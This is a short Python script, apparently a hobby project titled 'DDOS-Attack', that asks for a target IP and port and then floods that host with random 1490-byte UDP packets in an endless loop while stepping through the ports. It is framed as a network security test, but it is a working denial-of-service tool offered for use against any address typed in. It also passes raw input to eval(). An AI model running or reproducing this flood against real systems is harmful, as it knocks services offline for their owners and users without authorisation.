import os
import time
import socket
import scapy.all as scapy
import random

## DDOS-Attack [ASCII Art] ##

def display_banner():
    banner =  "██████╗ ██████╗  ██████╗ ███████╗       █████╗ ████████╗████████╗ █████╗  ██████╗██╗  ██╗\n"
    banner += "██╔══██╗██╔══██╗██╔═══██╗██╔════╝      ██╔══██╗╚══██╔══╝╚══██╔══╝██╔══██╗██╔════╝██║ ██╔╝\n"
    banner += "██║  ██║██║  ██║██║   ██║███████╗█████╗███████║   ██║      ██║   ███████║██║     █████╔╝\n"
    banner += "██║  ██║██║  ██║██║   ██║╚════██║╚════╝██╔══██║   ██║      ██║   ██╔══██║██║     ██╔═██╗\n"
    banner += "██████╔╝██████╔╝╚██████╔╝███████║      ██║  ██║   ██║      ██║   ██║  ██║╚██████╗██║  ██╗\n"
    banner += "╚═════╝ ╚═════╝  ╚═════╝ ╚══════╝      ╚═╝  ╚═╝   ╚═╝      ╚═╝   ╚═╝  ╚═╝ ╚═════╝╚═╝  ╚═╝\n"
    print(banner)


display_banner()

# Terminal header settings and information
os.system('color 0A')
print("Developer: David Polzoni")
print("Created date: 2023-04-26")
print('Project: DDOS-Attack')
print('Purpose: a simple DDOS-Attack tool to test your network security')
print()

# Date and time declaration and initialization
mydate = time.strftime('%Y-%m-%d')
mytime = time.strftime('%H-%M')

# Let's define socket and bytes for our attack
sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
bytes = random._urandom(1490)

# Type your ip and port number (find IP address using nslookup or any online website)
ip = input("IP target: ")
port = eval(input("Port: "))

# Let's start the attack
print("Starting the attack on ", ip, " at port ", port, "...")

time.sleep(5)
sent = 0
while True:
    sock.sendto(bytes, (ip, port))
    sent = sent + 1
    port = port + 1
    print("Sent %s packet to %s throught port:%s" % (sent, ip, port))
    if port == 65534:
        port = 1

# End of the script
os.system("cls")
input("Press Enter to exit...")
